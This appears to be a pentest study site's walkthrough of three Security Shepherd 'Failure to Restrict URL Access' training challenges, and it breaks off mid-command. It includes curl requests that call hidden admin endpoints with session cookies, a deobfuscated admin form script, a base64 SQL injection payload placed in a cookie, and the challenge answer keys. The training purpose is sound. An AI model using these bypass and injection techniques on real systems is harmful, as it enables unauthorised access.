

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.15.4. Failure to Restrict URL Access &mdash; South Bay WASP 1.0.2 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
        <link rel="up" title="3.15. Security Shepherd Web App Levels" href="security_shepherd.html"/>
        <link rel="next" title="3.15.5. Injection" href="security_shepherd_injection.html"/>
        <link rel="prev" title="3.15.3. CSRF" href="security_shepherd_csrf.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2 current"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a><ul class="current">
<li class="toctree-l3"><a class="reference internal" href="security_shepherd_intro.html">3.15.1. Security Shepherd Introduction</a></li>
<li class="toctree-l3"><a class="reference internal" href="security_shepherd_lessons.html">3.15.2. Lessons</a></li>
<li class="toctree-l3"><a class="reference internal" href="security_shepherd_csrf.html">3.15.3. CSRF</a></li>
<li class="toctree-l3 current"><a class="current reference internal" href="#">3.15.4. Failure to Restrict URL Access</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#failure-to-restrict-url-access-challenge-1">3.15.4.1. Failure to Restrict URL Access Challenge 1</a></li>
<li class="toctree-l4"><a class="reference internal" href="#failure-to-restrict-url-access-challenge-2">3.15.4.2. Failure to Restrict URL Access Challenge 2</a></li>
<li class="toctree-l4"><a class="reference internal" href="#failure-to-restrict-url-access-3">3.15.4.3. Failure to Restrict URL Access 3</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="security_shepherd_injection.html">3.15.5. Injection</a></li>
<li class="toctree-l3"><a class="reference internal" href="security_shepherd_crypto_storage.html">3.15.6. Insecure Cryptographic Storage</a></li>
<li class="toctree-l3"><a class="reference internal" href="security_shepherd_direct_ref.html">3.15.7. Insecure Direct Object References</a></li>
<li class="toctree-l3"><a class="reference internal" href="security_shepherd_session_management.html">3.15.8. Session Management</a></li>
<li class="toctree-l3"><a class="reference internal" href="security_shepherd_xss.html">3.15.9. XSS</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
          <li><a href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a> &raquo;</li>
        
      <li>3.15.4. Failure to Restrict URL Access</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/security_shepherd_url_access.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="failure-to-restrict-url-access">
<span id="securityshepherdurlaccess"></span><h1>3.15.4. Failure to Restrict URL Access<a class="headerlink" href="#failure-to-restrict-url-access" title="Permalink to this headline">¶</a></h1>
<div class="section" id="failure-to-restrict-url-access-challenge-1">
<h2>3.15.4.1. Failure to Restrict URL Access Challenge 1<a class="headerlink" href="#failure-to-restrict-url-access-challenge-1" title="Permalink to this headline">¶</a></h2>
<p>Viewing the page source using Firebug reveals hidden admin form leAdminForm with URL /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Tamper Data provides COOKIE, Firebug provides URL</span>
</span><span class="hll"><span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3=&quot;8C2wotxmF6z8gnPFaeTimw==&quot;&#39;</span>
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992&#39;</span>
</span>
curl --silent --insecure <span class="se">\</span>
     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data <span class="s1">&#39;userData=4816283&#39;</span> <span class="se">\</span>
     <span class="nv">$URL</span>
</pre></div>
</div>
<p>Running this form gives the result key.</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Result key is</span>
</span><span class="hll"><span class="go">DwKJkkHIBG8hxnn8RHxmPF89G3csUVmq8RXQXB+kVu6wN1BTY3412AxWbHq7cP+qghYCPH9Po/NJUanldZVaLCHckdybkL+pXWvP6TuGd4eJtms6BDl/o8CvtmdQeBPn</span>
</span></pre></div>
</div>
</div>
<div class="section" id="failure-to-restrict-url-access-challenge-2">
<h2>3.15.4.2. Failure to Restrict URL Access Challenge 2<a class="headerlink" href="#failure-to-restrict-url-access-challenge-2" title="Permalink to this headline">¶</a></h2>
<p>Viewing the page source using Firebug reveals this JavaScript:</p>
<div class="highlight-javascript"><div class="highlight"><pre><span></span><span class="nb">eval</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">k</span><span class="p">,</span><span class="nx">e</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">){</span><span class="k">return</span><span class="p">(</span><span class="nx">c</span><span class="o">&lt;</span><span class="nx">a</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nx">e</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">c</span><span class="o">/</span><span class="nx">a</span><span class="p">)))</span><span class="o">+</span><span class="p">((</span><span class="nx">c</span><span class="o">=</span><span class="nx">c</span><span class="o">%</span><span class="nx">a</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">35</span><span class="o">?</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">c</span><span class="o">+</span><span class="mi">29</span><span class="p">)</span><span class="o">:</span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">))};</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span><span class="nb">String</span><span class="p">)){</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="nx">d</span><span class="p">[</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)]</span><span class="o">=</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span><span class="o">||</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)}</span><span class="nx">k</span><span class="o">=</span><span class="p">[</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">d</span><span class="p">[</span><span class="nx">e</span><span class="p">]}];</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span><span class="s1">&#39;\\w+&#39;</span><span class="p">};</span><span class="nx">c</span><span class="o">=</span><span class="mi">1</span><span class="p">};</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]){</span><span class="nx">p</span><span class="o">=</span><span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\b&#39;</span><span class="o">+</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\\b&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">),</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])}}</span><span class="k">return</span> <span class="nx">p</span><span class="p">}(</span><span class="s1">&#39;$(&quot;#A&quot;).f(3(){$(&quot;#8&quot;).5(&quot;9&quot;);$(&quot;#7&quot;).4(&quot;1&quot;);$(&quot;#2&quot;).5(&quot;1&quot;,3(){e 0=$.h({i:&quot;j&quot;,b:&quot;v&quot;,c:{u:&quot;t&quot;,},d:g});m(0.6==k){$(&quot;#2&quot;).a(0.s)}q{$(&quot;#2&quot;).a(&quot;&lt;p&gt; l r n: &quot;+0.6+&quot; &quot;+0.o+&quot;&lt;/p&gt;&quot;)}$(&quot;#2&quot;).4(&quot;1&quot;,3(){$(&quot;#7&quot;).5(&quot;9&quot;,3(){$(&quot;#8&quot;).4(&quot;1&quot;)})})})});$(&quot;#w&quot;).f(3(){$(&quot;#8&quot;).5(&quot;9&quot;);$(&quot;#7&quot;).4(&quot;1&quot;);$(&quot;#2&quot;).5(&quot;1&quot;,3(){e 0=$.h({i:&quot;j&quot;,b:&quot;x&quot;,c:{y:&quot;z&quot;,},d:g});m(0.6==k){$(&quot;#2&quot;).a(0.s)}q{$(&quot;#2&quot;).a(&quot;&lt;p&gt; l r n: &quot;+0.6+&quot; &quot;+0.o+&quot;&lt;/p&gt;&quot;)}$(&quot;#2&quot;).4(&quot;1&quot;,3(){$(&quot;#7&quot;).5(&quot;9&quot;,3(){$(&quot;#8&quot;).4(&quot;1&quot;)})})})});&#39;</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="s1">&#39;ajaxCall|slow|resultsDiv|function|show|hide|status|loadingSign|submitButton|fast|html|url|data|async|var|submit|false|ajax|type|POST|200|An|if|Occurred|statusText||else|Error|responseText|ismcoa98sUD8j21dmdoasmcoISOdjh3189|guestData|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa|leAdministratorFormOfAwesomeness|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin|adminData|youAreAnAdminOfAwesomenessWoopWoop|leForm&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span><span class="mi">0</span><span class="p">,{}))</span>
</pre></div>
</div>
<p>Running this JavaScript through the <a class="reference external" href="http://www.jspretty.com/">http://www.jspretty.com/</a> gives us this readable code:</p>
<div class="highlight-javascript"><div class="highlight"><pre><span></span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#leForm&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#submitButton&quot;</span><span class="p">).</span><span class="nx">hide</span><span class="p">(</span><span class="s2">&quot;fast&quot;</span><span class="p">);</span>
    <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#loadingSign&quot;</span><span class="p">).</span><span class="nx">show</span><span class="p">(</span><span class="s2">&quot;slow&quot;</span><span class="p">);</span>
    <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#resultsDiv&quot;</span><span class="p">).</span><span class="nx">hide</span><span class="p">(</span><span class="s2">&quot;slow&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">ajaxCall</span> <span class="o">=</span> <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
            <span class="nx">type</span><span class="o">:</span> <span class="s2">&quot;POST&quot;</span><span class="p">,</span>
            <span class="nx">url</span><span class="o">:</span> <span class="s2">&quot;278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa&quot;</span><span class="p">,</span>
            <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
                <span class="nx">guestData</span><span class="o">:</span> <span class="s2">&quot;ismcoa98sUD8j21dmdoasmcoISOdjh3189&quot;</span><span class="p">,</span>
            <span class="p">},</span>
            <span class="nx">async</span><span class="o">:</span> <span class="kc">false</span>
        <span class="p">});</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">ajaxCall</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#resultsDiv&quot;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">ajaxCall</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#resultsDiv&quot;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s2">&quot;&lt;p&gt; An Error Occurred: &quot;</span> <span class="o">+</span> <span class="nx">ajaxCall</span><span class="p">.</span><span class="nx">status</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="nx">ajaxCall</span><span class="p">.</span><span class="nx">statusText</span> <span class="o">+</span> <span class="s2">&quot;&lt;/p&gt;&quot;</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#resultsDiv&quot;</span><span class="p">).</span><span class="nx">show</span><span class="p">(</span><span class="s2">&quot;slow&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#loadingSign&quot;</span><span class="p">).</span><span class="nx">hide</span><span class="p">(</span><span class="s2">&quot;fast&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#submitButton&quot;</span><span class="p">).</span><span class="nx">show</span><span class="p">(</span><span class="s2">&quot;slow&quot;</span><span class="p">)</span>
            <span class="p">})</span>
        <span class="p">})</span>
    <span class="p">})</span>
<span class="p">});</span>
<span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#leAdministratorFormOfAwesomeness&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#submitButton&quot;</span><span class="p">).</span><span class="nx">hide</span><span class="p">(</span><span class="s2">&quot;fast&quot;</span><span class="p">);</span>
    <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#loadingSign&quot;</span><span class="p">).</span><span class="nx">show</span><span class="p">(</span><span class="s2">&quot;slow&quot;</span><span class="p">);</span>
    <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#resultsDiv&quot;</span><span class="p">).</span><span class="nx">hide</span><span class="p">(</span><span class="s2">&quot;slow&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">ajaxCall</span> <span class="o">=</span> <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
            <span class="nx">type</span><span class="o">:</span> <span class="s2">&quot;POST&quot;</span><span class="p">,</span>
            <span class="nx">url</span><span class="o">:</span> <span class="s2">&quot;278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin&quot;</span><span class="p">,</span>
            <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
                <span class="nx">adminData</span><span class="o">:</span> <span class="s2">&quot;youAreAnAdminOfAwesomenessWoopWoop&quot;</span><span class="p">,</span>
            <span class="p">},</span>
            <span class="nx">async</span><span class="o">:</span> <span class="kc">false</span>
        <span class="p">});</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">ajaxCall</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#resultsDiv&quot;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">ajaxCall</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#resultsDiv&quot;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s2">&quot;&lt;p&gt; An Error Occurred: &quot;</span> <span class="o">+</span> <span class="nx">ajaxCall</span><span class="p">.</span><span class="nx">status</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="nx">ajaxCall</span><span class="p">.</span><span class="nx">statusText</span> <span class="o">+</span> <span class="s2">&quot;&lt;/p&gt;&quot;</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#resultsDiv&quot;</span><span class="p">).</span><span class="nx">show</span><span class="p">(</span><span class="s2">&quot;slow&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#loadingSign&quot;</span><span class="p">).</span><span class="nx">hide</span><span class="p">(</span><span class="s2">&quot;fast&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#submitButton&quot;</span><span class="p">).</span><span class="nx">show</span><span class="p">(</span><span class="s2">&quot;slow&quot;</span><span class="p">)</span>
            <span class="p">})</span>
        <span class="p">})</span>
    <span class="p">})</span>
<span class="p">});</span>
</pre></div>
</div>
<p>This code has form leAdministratorFormOfAwesomeness with URL /challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin and parameter <strong>adminData=youAreAnAdminOfAwesomenessWoopWoop</strong>.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Tamper Data provides COOKIE</span>
</span><span class="hll"><span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3=&quot;8C2wotxmF6z8gnPFaeTimw==&quot;&#39;</span>
</span><span class="hll"><span class="c1"># The beautified JavaScript gives us the URL and POSTDATA</span>
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges&#39;</span>
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin&quot;</span>
</span><span class="hll"><span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;adminData=youAreAnAdminOfAwesomenessWoopWoop&#39;</span>
</span>
curl --silent --insecure <span class="se">\</span>
     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data-urlencode <span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
     <span class="nv">$URL</span>
</pre></div>
</div>
<p>Running this form gives the result key:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Hey Admin, Here is that key you are looking for:</span>
</span><span class="hll"><span class="go">lB1GNb6ecyIGCTnzH7I2IeQ5XyG/HvlxMnFvhGwa7oNJWNzeibZknLNNtsAYGfluTOEhYGthAXzu2mqp2uchDWPzNKxW2Dfu0hiBoru1FPtfL5sfrGoSdcBXshAuVP/d</span>
</span></pre></div>
</div>
</div>
<div class="section" id="failure-to-restrict-url-access-3">
<h2>3.15.4.3. Failure to Restrict URL Access 3<a class="headerlink" href="#failure-to-restrict-url-access-3" title="Permalink to this headline">¶</a></h2>
<p>Viewing the page source using Firebug reveals form leForm2 with URL /challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Tamper Data provides COOKIE and URL</span>
</span><span class="hll"><span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;currentPerson=YUd1ZXN0; JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3=&quot;8C2wotxmF6z8gnPFaeTimw==&quot;&#39;</span>
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList&#39;</span>
</span>
curl --silent --insecure  <span class="se">\</span>
     -X POST <span class="se">\</span>
     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>Running this form lists these 17 users: aGuest, manager, sean, root, administrator, privileged, seanduggan, markdenihan, mark, superuser, megauser, hyperuser, godzilla, kinguser, rootuser, adminuser, and shepherd.</p>
<p>Looking more closely at the <strong>currentPerson=YUd1ZXN0</strong> cookie reveals “YUd1ZXN0” is base64 encoding of “aGuest”. What didn’t work is substituting each of the 17 above user accounts (base64 encoded) for “aGuest” in the cookie used to access the button <span class="guilabel">Admin Only Button</span>.</p>
<p>However, assuming the cookie is SQL injectable, trying the base64 equivalent of <strong>currentPerson=” OR “1” != “0</strong> returns a user list.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Tamper Data provides COOKIE, Firebug provides URL</span>
</span><span class="hll"><span class="nv">U</span><span class="o">=</span><span class="s1">&#39;&quot; OR &quot;1&quot; != &quot;0&#39;</span>
</span><span class="hll"><span class="nv">B64U</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$U</span><span class="s2">&quot;</span> <span class="p">|</span> base64<span class="k">)</span>
</span><span class="hll"><span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;currentPerson=&#39;</span><span class="s2">&quot;</span><span class="nv">$B64U</span><span class="s2">&quot;</span><span class="s1">&#39;; JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3=&quot;8C2wotxmF6z8gnPFaeTimw==&quot;&#39;</span>
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList&#39;</span>
</span>
curl -v --insecure  <span class="se">\</span>
     -X POST <span class="se">\</span>
     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>Running this lists 18 users: the 17 users above plus MrJohnReillyTheSecond. One last try for the button <span class="guilabel">Admin Only Button</span> using MrJohnReillyTheSecond gives the result key:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Tamper Data provides COOKIE, Firebug or Tamper Data provides URL</span>
</span><span class="hll"><span class="nv">U</span><span class="o">=</span><span class="s2">&quot;MrJohnReillyTheSecond&quot;</span>
</span><span class="hll"><span class="nv">B64U</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$U</span><span class="s2">&quot;</span> <span class="p">|</span> base64<span class="k">)</span>
</span><span class="hll"><span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;currentPerson=&#39;</span><span class="s2">&quot;</span><span class="nv">$B64U</span><span class="s2">&quot;</span><span class="s1">&#39;; JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3=&quot;8C2wotxmF6z8gnPFaeTimw==&quot;&#39;</span>
